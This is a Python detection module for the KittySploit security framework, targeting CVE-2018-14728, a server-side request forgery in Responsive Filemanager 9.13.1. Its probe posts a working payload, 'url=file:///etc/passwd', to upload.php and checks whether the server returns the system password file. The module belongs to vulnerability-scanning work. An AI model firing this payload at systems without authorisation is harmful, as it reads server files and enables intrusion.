#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""Responsive filemanager 9."""

import re
from kittysploit import *
from lib.protocols.http.http_client import Http_client


class Module(Scanner, Http_client):
    __info__ = {
        'name': 'Responsive filemanager 9.13.1 Server-Side Request Forgery Detection',
        'description': 'Responsive filemanager 9.13.1 is susceptible to server-side request forgery in upload.php via the url parameter.',
        'author': ['KittySploit Team'],
        'severity': 'critical',
        'tags': ['web', 'scanner', 'cve', 'cve2018', 'ssrf', 'lfi', 'packetstorm', 'edb', 'intrusive', 'tecrail', 'vuln'],
        'agent': {
            'risk': 'active',
            'effects': ['network_probe'],
            'expected_requests': 1,
            'reversible': True,
            'approval_required': False,
            'produces': ['tech_hints', 'risk_signals', 'endpoints'],
            'cost': 1.0,
            'noise': 0.3,
            'value': 1.0,
            'requires': {
                'min_endpoints': 0,
                'min_params': 0,
                'tech_hints_any': [],
                'tech_hints_all': [],
                'specializations_any': [],
                'risk_signals_any': [],
                'auth_session': False,
                'capabilities_any': [],
                'capabilities_all': [],
                'confidence_min': {},
                'confidence_min_any': {},
                'endpoint_pattern_any': [],
                'param_any': [],
                'api_surface_ready': False,
            },
            'chain': {
                'produces_capabilities': [
                    {
                        'capability': 'admin_surface',
                        'from_detail': '',
                    },
                ],
                'consumes_capabilities': [],
                'option_bindings': {},
                'suggested_followups': [],
            },
        },
        'references': [
            'http://packetstormsecurity.com/files/148742/Responsive-Filemanager-9.13.1-Server-Side-Request-Forgery.html',
            'https://www.exploit-db.com/exploits/45103/',
            'https://nvd.nist.gov/vuln/detail/CVE-2018-14728',
            'https://github.com/ARPSyndicate/kenzer-templates',
        ],
        'cve': 'CVE-2018-14728',
    }

    def run(self):
        path = '/filemanager/upload.php'
        r = self.http_request(method='POST', path=path, allow_redirects=False, data='fldr=&url=file:///etc/passwd')
        if not r or r.status_code != 200:
            return False
        body = r.text or ""
        body_regexes = ('root:.*:0:0:',)
        if any(re.search(rx, body) for rx in body_regexes):
            self.set_info(
                severity='critical',
                reason='Responsive filemanager 9.13.1 Server-Side Request Forgery detected',
                path=path,
            )
            return True
        return False

